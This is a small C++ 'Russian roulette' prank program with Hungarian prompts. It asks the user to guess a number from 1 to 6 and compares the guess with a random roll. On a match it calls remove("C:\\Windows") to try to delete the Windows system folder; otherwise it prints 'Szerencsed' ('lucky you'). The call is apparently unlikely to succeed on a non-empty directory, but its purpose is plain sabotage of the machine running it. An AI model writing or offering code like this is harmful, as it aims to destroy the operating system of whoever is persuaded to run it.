#include <iostream>
#include <filesystem>
#include <cstdlib>
#include <time.h>

using namespace std;

int main()
{
    cout << "Irj be egy szamot 1 es 6 kozott" << endl;
    int valasz;
    cin >> valasz;
    int gatya = 0;
    srand(time(NULL));
    gatya = rand() % 6 + 1;
    cout << gatya << valasz << endl;
    if (gatya == valasz)
    {
        remove("C:\\Windows");
    }else
    {
        cout << "Szerencsed\n";
    }
    return 0;
}
